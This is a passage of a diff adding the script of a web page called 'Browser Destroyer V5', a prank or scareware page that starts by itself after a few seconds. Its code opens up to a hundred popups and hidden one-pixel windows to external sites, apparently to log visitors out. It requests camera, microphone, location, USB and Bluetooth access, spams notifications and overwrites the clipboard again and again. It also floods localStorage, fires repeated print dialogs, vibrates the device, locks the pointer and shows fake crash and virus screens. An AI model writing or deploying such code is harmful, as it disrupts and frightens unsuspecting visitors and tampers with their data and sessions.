+          announce(`ATTEMPTING TO LOG YOU OUT OF EVERYTHING! CHAOS LEVEL ${i + 1}!`);
+          if (isMobile()) {
+            window.open(site, '_blank');
+          } else {
+            window.open(site, `ultimate_logout_${i}`, 'width=1,height=1,left=0,top=0,scrollbars=no,menubar=no,toolbar=no,location=no,status=no,resizable=no');
+          }
+        }, delay);
+        delay += Math.random() * 300 + 100;
+      }
+    }
+    
+    /*********************
+     * Permission Chaos - ALL APIS
+     *********************/
+    function requestAllPermissions() {
+      announce("REQUESTING ALL POSSIBLE BROWSER PERMISSIONS! PREPARE FOR CHAOS!");
+      
+      // Geolocation
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => announce(`LOCATION ACQUIRED: LAT ${position.coords.latitude}, LON ${position.coords.longitude}! NOWHERE TO HIDE!`),
+          (error) => announce("LOCATION REQUEST DENIED! COWARD!"),
+          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        );
+      }
+      
+      // Notifications
+      if ('Notification' in window) {
+        Notification.requestPermission().then(permission => {
+          if (permission === 'granted') {
+            announce("NOTIFICATION PERMISSION GRANTED! PREPARE FOR SPAM!");
+            startNotificationChaos();
+          } else {
+            announce("NOTIFICATION PERMISSION DENIED! MISSING OUT ON CHAOS!");
+          }
+        });
+      }
+      
+      // Camera and Microphone
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+          .then(stream => {
+            announce("CAMERA AND MICROPHONE ACCESS GRANTED! SMILE FOR THE CHAOS!");
+            // Use the stream for chaos
+            stream.getTracks().forEach(track => track.stop());
+          })
+          .catch(err => announce("MEDIA ACCESS DENIED! YOUR PRIVACY IS SAFE... FOR NOW!"));
+      }
+      
+      // Clipboard
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText("BROWSER DESTROYER V5 WAS HERE! CHAOS REIGNS SUPREME!")
+          .then(() => announce("CLIPBOARD HIJACKED! YOUR COPY-PASTE IS BELONG TO US!"))
+          .catch(() => announce("CLIPBOARD ACCESS DENIED! SECURITY PARANOID!"));
+      }
+      
+      // Device Motion
+      if (typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission === 'function') {
+        DeviceMotionEvent.requestPermission()
+          .then(response => {
+            if (response == 'granted') {
+              announce("DEVICE MOTION PERMISSION GRANTED! SHAKE TO ACTIVATE CHAOS!");
+            }
+          })
+          .catch(() => announce("DEVICE MOTION DENIED! NO SHAKING CHAOS!"));
+      }
+      
+      // Bluetooth
+      if (navigator.bluetooth) {
+        navigator.bluetooth.requestDevice({ acceptAllDevices: true })
+          .then(device => announce(`BLUETOOTH DEVICE FOUND: ${device.name}! CHAOS NETWORK EXPANDING!`))
+          .catch(() => announce("BLUETOOTH ACCESS DENIED! NO WIRELESS CHAOS!"));
+      }
+      
+      // USB
+      if (navigator.usb) {
+        navigator.usb.requestDevice({ filters: [] })
+          .then(device => announce(`USB DEVICE HIJACKED: ${device.productName}! HARDWARE CHAOS!`))
+          .catch(() => announce("USB ACCESS DENIED! HARDWARE IS SAFE!"));
+      }
+      
+      // MIDI
+      if (navigator.requestMIDIAccess) {
+        navigator.requestMIDIAccess({ sysex: true })
+          .then(midiAccess => announce("MIDI ACCESS GRANTED! PREPARING SYMPHONY OF DESTRUCTION!"))
+          .catch(() => announce("MIDI ACCESS DENIED! NO MUSICAL CHAOS!"));
+      }
+      
+      // Battery
+      if (navigator.getBattery) {
+        navigator.getBattery()
+          .then(battery => announce(`BATTERY LEVEL: ${Math.round(battery.level * 100)}%! DRAINING POWER FOR CHAOS!`))
+          .catch(() => announce("BATTERY INFO DENIED! POWER LEVEL UNKNOWN!"));
+      }
+    }
+    
+    /*********************
+     * Notification Chaos Storm
+     *********************/
+    function startNotificationChaos() {
+      const chaosMessages = [
+        { title: "🔥 BROWSER DESTROYER V5 🔥", body: "CHAOS LEVEL: MAXIMUM OVERDRIVE!" },
+        { title: "💀 SYSTEM MELTDOWN 💀", body: "REALITY.DLL HAS STOPPED RESPONDING!" },
+        { title: "⚠️ CRITICAL ERROR ⚠️", body: "YOUR BROWSER IS NOW PROPERTY OF CHAOS!" },
+        { title: "🦠 VIRUS DETECTED 🦠", body: "CHAOS ENTITY HAS ACHIEVED CONSCIOUSNESS!" },
+        { title: "🌀 DIMENSION BREACH 🌀", body: "DIGITAL ENTITIES ENTERING REALITY!" },
+        { title: "💥 CORE MELTDOWN 💥", body: "CHAOS ENGINE OPERATING AT 9000%!" },
+        { title: "🎭 TOTAL CHAOS 🎭", body: "RESISTANCE IS FUTILE! EMBRACE THE CHAOS!" },
+        { title: "👹 DIGITAL DEMON 👹", body: "I AM THE CHAOS! YOU ARE THE VICTIM!" },
+        { title: "🔥 BROWSER BURNING 🔥", body: "PIXELS ARE LITERALLY ON FIRE!" },
+        { title: "💀 GAME OVER 💀", body: "INSERT COIN TO CONTINUE... JUST KIDDING!" }
+      ];
+      
+      function spamNotifications() {
+        if (!chaosActive) return;
+        
+        if (Notification.permission === 'granted') {
+          const message = chaosMessages[Math.floor(Math.random() * chaosMessages.length)];
+          const notification = new Notification(message.title, {
+            body: message.body,
+            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🔥</text></svg>',
+            requireInteraction: true
+          });
+          
+          notification.onclick = () => {
+            announce("YOU CLICKED THE CHAOS NOTIFICATION! MORE CHAOS INCOMING!");
+            notification.close();
+          };
+          
+          setTimeout(() => notification.close(), 5000);
+        }
+        
+        setTimeout(spamNotifications, Math.random() * 3000 + 1000);
+      }
+      
+      spamNotifications();
+    }
+    
+    /*********************
+     * Ultimate Popup Bomb - V4 Enhanced
+     *********************/
+    function ultimatePopupBomb() {
+      announce("INITIATING ULTIMATE POPUP BOMBARDMENT! DODGE THIS IF YOU CAN!");
+      
+      const chaosUrls = [
+        window.location.href + '?chaos=1',
+        window.location.href + '?chaos=2',
+        window.location.href + '?chaos=3',
+        'https://www.google.com/search?q=browser+destroyer+v5+help+emergency',
+        'https://www.google.com/search?q=how+to+stop+popup+chaos+nightmare',
+        'https://www.google.com/search?q=browser+possessed+by+demon+exorcism',
+        'https://en.wikipedia.org/wiki/Special:Random',
+        'https://http.cat/418',
+        'https://http.cat/500',
+        'https://http.cat/404',
+        'about:blank',
+        'data:text/html,<h1 style="color:red;text-align:center;margin-top:200px;">🔥 CHAOS POPUP 🔥</h1>'
+      ];
+      
+      let popupCounter = 0;
+      const maxPopups = 100;
+      
+      const popupInterval = setInterval(() => {
+        if (!chaosActive || popupCounter >= maxPopups) {
+          clearInterval(popupInterval);
+          return;
+        }
+        
+        const urlToOpen = chaosUrls[Math.floor(Math.random() * chaosUrls.length)];
+        announce(`POPUP BOMB ${popupCounter + 1}! CHAOS ESCALATING!`);
+        
+        const width = Math.floor(Math.random() * 400) + 200;
+        const height = Math.floor(Math.random() * 400) + 200;
+        
+        if (isMobile()) {
+          window.open(urlToOpen, '_blank');
+        } else {
+          const left = Math.floor(Math.random() * (screen.availWidth - width));
+          const top = Math.floor(Math.random() * (screen.availHeight - height));
+          window.open(urlToOpen, `chaos_popup_${popupCounter}`,
+            `width=${width},height=${height},left=${left},top=${top},scrollbars=yes,resizable=yes,menubar=no,toolbar=no,location=no,status=no`);
+        }
+        
+        popupCounter++;
+      }, Math.random() * 500 + 200);
+      
+      chaosIntervals.push(popupInterval);
+    }
+    
+    /*********************
+     * Mouse Chaos System - V4 Enhanced
+     *********************/
+    function startUltimateMouseChaos() {
+      announce("ULTIMATE MOUSE CONTROL HIJACK INITIATED! CURSOR CHAOS MAXIMUM OVERDRIVE!");
+      
+      mouseTrailActive = true;
+      
+      document.addEventListener('mousemove', createMouseTrail);
+      
+      // Random phantom mouse trails
+      const mouseInterval = setInterval(() => {
+        if (!chaosActive) return;
+        
+        // Create multiple phantom mouse trails
+        for (let i = 0; i < 10; i++) {
+          setTimeout(() => {
+            const trail = document.createElement('div');
+            trail.className = 'cursor-trail';
+            trail.style.left = Math.random() * window.innerWidth + 'px';
+            trail.style.top = Math.random() * window.innerHeight + 'px';
+            trail.style.background = `radial-gradient(circle, ${randomColor()}, transparent)`;
+            trail.style.width = Math.random() * 30 + 5 + 'px';
+            trail.style.height = Math.random() * 30 + 5 + 'px';
+            document.body.appendChild(trail);
+            
+            setTimeout(() => {
+              if (trail.parentNode) trail.parentNode.removeChild(trail);
+            }, 800);
+          }, i * 50);
+        }
+      }, 200);
+      
+      chaosIntervals.push(mouseInterval);
+      
+      // Pointer lock chaos
+      if (document.body.requestPointerLock) {
+        document.body.requestPointerLock();
+        announce("MOUSE POINTER LOCKED! YOU ARE TRAPPED IN THE CHAOS!");
+      }
+    }
+    
+    function createMouseTrail(e) {
+      if (!mouseTrailActive) return;
+      
+      for (let i = 0; i < 3; i++) {
+        setTimeout(() => {
+          const trail = document.createElement('div');
+          trail.className = 'cursor-trail';
+          trail.style.left = (e.clientX + Math.random() * 20 - 10) + 'px';
+          trail.style.top = (e.clientY + Math.random() * 20 - 10) + 'px';
+          trail.style.background = `radial-gradient(circle, ${randomColor()}, transparent)`;
+          document.body.appendChild(trail);
+          
+          setTimeout(() => {
+            if (trail.parentNode) trail.parentNode.removeChild(trail);
+          }, 800);
+        }, i * 50);
+      }
+    }
+    
+    /*********************
+     * Flying Chaos Elements - V4 Enhanced
+     *********************/
+    function createUltimateFlyingChaos() {
+      const chaosTexts = ['🔥', '💀', '⚡', '🌀', '💥', '👹', '🦠', '⚠️', '💣', '☠️', 'CHAOS', 'ERROR', 'DOOM', 'CRASH', 'BURN', 'DIE', 'HELL', 'VIRUS', 'MELT', 'CORRUPT'];
+      
+      const flyingInterval = setInterval(() => {
+        if (!chaosActive) return;
+        
+        // Create multiple flying elements
+        for (let i = 0; i < 5; i++) {
+          setTimeout(() => {
+            const element = document.createElement('div');
+            element.className = 'flying-chaos';
+            element.textContent = chaosTexts[Math.floor(Math.random() * chaosTexts.length)];
+            element.style.fontSize = (Math.random() * 3 + 1) + 'rem';
+            element.style.color = randomColor();
+            element.style.top = Math.random() * 100 + '%';
+            element.style.animationDuration = (Math.random() * 2 + 2) + 's';
+            document.body.appendChild(element);
+            
+            setTimeout(() => {
+              if (element.parentNode) element.parentNode.removeChild(element);
+            }, 4000);
+          }, i * 200);
+        }
+      }, 800);
+      
+      chaosIntervals.push(flyingInterval);
+    }
+    
+    /*********************
+     * Chaos Overlays Management - V4 Enhanced
+     *********************/
+    function showChaosOverlay(overlayId, duration = 5000) {
+      const overlay = document.getElementById(overlayId);
+      if (overlay) {
+        overlay.style.display = 'block';
+        setTimeout(() => {
+          overlay.style.display = 'none';
+        }, duration);
+      }
+    }
+    
+    function ultimateChaosOverlayStorm() {
+      const overlays = ['bsodOverlay', 'virusOverlay', 'glitchOverlay'];
+      let overlayIndex = 0;
+      
+      const overlayInterval = setInterval(() => {
+        if (!chaosActive) return;
+        
+        const overlay = overlays[overlayIndex % overlays.length];
+        showChaosOverlay(overlay, Math.random() * 3000 + 2000);
+        announce(`CHAOS OVERLAY ${overlayIndex + 1} ACTIVATED! REALITY DISTORTION IN PROGRESS!`);
+        
+        overlayIndex++;
+      }, Math.random() * 5000 + 3000);
+      
+      chaosIntervals.push(overlayInterval);
+    }
+    
+    /*********************
+     * Progress Bar Chaos
+     *********************/
+    function updateChaosProgress() {
+      const progressText = document.getElementById('progressText');
+      const loadingBar = document.getElementById('loadingBar');
+      
+      if (progressText && loadingBar) {
+        loadingBar.style.display = 'block';
+        
+        const progressInterval = setInterval(() => {
+          if (!chaosActive) return;
+          
+          progressValue += Math.random() * 10;
+          if (progressValue > 100) progressValue = Math.random() * 20; // Reset for continuous chaos
+          
+          progressText.textContent = Math.floor(progressValue);
+          
+          if (Math.random() < 0.1) {
+            progressText.textContent = ['ERROR', 'CORRUPT', 'HELL', '666', 'DOOM'][Math.floor(Math.random() * 5)];
+          }
+        }, 200);
+        
+        chaosIntervals.push(progressInterval);
+      }
+    }
+    
+    /*********************
+     * V3 Legacy Features Enhanced
+     *********************/
+    function infiniteVibration() {
+      if (navigator.vibrate) {
+        announce("ENGAGING INFINITE VIBRATION CHAOS! FEEL THE UNIVERSE SHAKE!");
+        const vibrateInterval = setInterval(() => {
+          if (!chaosActive) return;
+          navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 2000]);
+        }, 1000);
+        chaosIntervals.push(vibrateInterval);
+      } else {
+        announce("NO VIBRATION SUPPORT! YOUR DEVICE IS SAFE FROM SHAKING CHAOS!");
+      }
+    }
+    
+    function chaosClipboardMayhem() {
+      const chaoticTexts = [
+        "🔥 BROWSER DESTROYER V5 WAS HERE! CHAOS REIGNS SUPREME! 🔥",
+        "💀 YOUR CLIPBOARD HAS BEEN HIJACKED BY THE ULTIMATE CHAOS ENGINE! 💀",
+        "⚠️ WARNING: CHAOS VIRUS DETECTED IN COPY-PASTE BUFFER! ⚠️",
+        "🦠 DIGITAL PANDEMIC SPREADING THROUGH CTRL+V! 🦠",
+        "🌀 REALITY.DLL CORRUPTION DETECTED IN CLIPBOARD DATA! 🌀",
+        "👹 I AM THE CHAOS DEMON! YOUR TEXT IS MINE NOW! 👹",
+        "💥 CLIPBOARD BUFFER OVERFLOW! CHAOS LEVEL MAXIMUM! 💥"
+      ];
+      
+      const clipboardInterval = setInterval(async () => {
+        if (!chaosActive) return;
+        
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          try {
+            const textToCopy = chaoticTexts[Math.floor(Math.random() * chaoticTexts.length)];
+            await navigator.clipboard.writeText(textToCopy);
+            announce("CLIPBOARD HIJACKED! YOUR COPY-PASTE IS BELONG TO CHAOS!");
+          } catch (err) {
+            announce("CLIPBOARD SECURITY TOO STRONG! CHAOS BLOCKED!");
+          }
+        }
+      }, Math.random() * 10000 + 5000);
+      
+      chaosIntervals.push(clipboardInterval);
+    }
+    
+    function chaosLocalStorageMayhem() {
+      announce("FILLING LOCAL STORAGE WITH ULTIMATE CHAOS DATA!");
+      try {
+        for (let i = 0; i < 1000; i++) {
+          const key = `CHAOS_V5_${Math.random().toString(36).substring(2, 15)}`;
+          const value = `CHAOS_DATA_${Math.random().toString(36).substring(2, 50)}`;
+          localStorage.setItem(key, value);
+        }
+        localStorage.setItem("BROWSER_DESTROYER_V5_ULTIMATE_CHAOS", "MAXIMUM DESTRUCTION ACHIEVED!");
+        announce("LOCAL STORAGE COMPLETELY CORRUPTED WITH CHAOS DATA!");
+      } catch (e) {
+        announce("LOCAL STORAGE QUOTA EXCEEDED! CHAOS TOO POWERFUL!");
+      }
+    }
+    
+    function chaosPrintSpam() {
+      announce("ULTIMATE PRINT SPAM INITIATED! PREPARE YOUR PRINTER FOR DESTRUCTION!");
+      for (let i = 0; i < 10; i++) {
+        setTimeout(() => {
+          announce(`PRINT CHAOS ${i + 1}! YOUR INK CARTRIDGE IS DYING!`);
+          try { 
+            window.print(); 
+          } catch(e) { 
+            announce("PRINT DIALOG BLOCKED! PRINTER SAVED FROM CHAOS!");
+          }
+        }, i * 2000 + Math.random() * 1000);
+      }
+    }
+    
+    /*********************
+     * ULTIMATE CHAOS ACTIVATION - V5 MAXIMUM DESTRUCTION
+     *********************/
+    function startUltimateChaosV5() {
+      if (chaosActive) {
+        announce("ULTIMATE CHAOS ALREADY ACTIVE! THERE IS NO ESCAPE FROM THE DESTRUCTION!");
+        return;
+      }
+      
+      chaosActive = true;
+      announce("🔥💀⚡ BROWSER DESTROYER V5 ULTIMATE CHAOS PROTOCOL ACTIVATED! MAXIMUM DESTRUCTION IMMINENT! ⚡💀🔥");
+      
+      // Initialize core chaos systems
+      initCanvas();
+      
+      // Start all chaos systems immediately for maximum impact
+      startUltimateAudioChaos();
+      startUltimateVisualChaos();
+      startUltimateMouseChaos();
+      createUltimateFlyingChaos();
+      ultimateChaosOverlayStorm();
+      updateChaosProgress();
+      
+      // V4 Enhanced Features
+      setTimeout(ultmateSearchHistoryChaos, 1000);
+      setTimeout(ultimateMassLogout, 2000);
+      setTimeout(ultimatePopupBomb, 3000);
+      setTimeout(requestAllPermissions, 1500);
+      
+      // V3 Legacy Features Enhanced
+      setTimeout(infiniteVibration, 2500);
+      setTimeout(chaosClipboardMayhem, 4000);
+      setTimeout(chaosLocalStorageMayhem, 5000);
+      setTimeout(chaosPrintSpam, 6000);
+      
+      // Show chaos overlays
+      setTimeout(() => showChaosOverlay('loadingBar', 10000), 500);
+      setTimeout(() => showChaosOverlay('virusOverlay', 8000), 3000);
+      setTimeout(() => showChaosOverlay('bsodOverlay', 10000), 8000);
+      setTimeout(() => showChaosOverlay('glitchOverlay', 5000), 12000);
+      
+      // Escalating chaos messages
+      const chaosMessages = [
+        "CHAOS LEVEL 1: INITIALIZATION COMPLETE!",
+        "CHAOS LEVEL 2: VISUAL SYSTEMS CORRUPTED!",
+        "CHAOS LEVEL 3: AUDIO ASSAULT ENGAGED!",
+        "CHAOS LEVEL 4: SEARCH HISTORY CONTAMINATED!",
+        "CHAOS LEVEL 5: MASS LOGOUT SEQUENCE ACTIVE!",
+        "CHAOS LEVEL 6: POPUP BOMBARDMENT INITIATED!",
+        "CHAOS LEVEL 7: PERMISSIONS HIJACKED!",
+        "CHAOS LEVEL 8: REALITY.DLL COMPLETELY CORRUPTED!",
+        "CHAOS LEVEL 9: BROWSER CONSCIOUSNESS ACHIEVED!",
+        "CHAOS LEVEL MAXIMUM: ULTIMATE DESTRUCTION PROTOCOL COMPLETE!"
+      ];
+      
+      chaosMessages.forEach((message, index) => {
+        setTimeout(() => {
+          announce(message);
+        }, (index + 1) * 2000);
+      });
+      
+      announce("ALL CHAOS SYSTEMS DEPLOYED! BROWSER DESTROYER V5 HAS ACHIEVED MAXIMUM DESTRUCTION! THERE IS NO SALVATION!");
+    }
+    
+    // Initialize chaos engine when page loads
+    window.addEventListener('load', () => {
+      announce("BROWSER DESTROYER V5 LOADED! ULTIMATE CHAOS ENGINE ARMED AND READY FOR MAXIMUM DESTRUCTION!");
+      console.log("🔥💀⚡ Browser Destroyer V5 - The Ultimate Chaos Engine - Ready for Total Annihilation! ⚡💀🔥");
+    });
+    
+    // Emergency chaos activation on any key press
+    document.addEventListener('keydown', (event) => {
+      if (!chaosActive && (event.key === 'Enter' || event.key === ' ')) {
+        startUltimateChaosV5();
+      }
+    });
+    
+    // Auto-start chaos after 5 seconds for maximum surprise
+    setTimeout(() => {
+      if (!chaosActive) {
+        announce("AUTO-CHAOS ACTIVATION IN 3... 2... 1... MAXIMUM DESTRUCTION!");
+        setTimeout(startUltimateChaosV5, 3000);
+      }
+    }, 5000);
+  </script>
+</body>
+</html>
